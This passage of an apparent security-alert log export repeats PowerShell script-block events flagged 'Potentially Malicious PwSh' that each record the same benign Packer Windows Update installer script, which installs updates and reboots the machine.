unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:07:23.866 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,21,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: 6a9ebf08-f055-4b94-8ff8-44e23c96d974 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:09:54.712 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,25,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: b2d18307-ea2c-46a7-a113-cbe5bba4cebf ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { 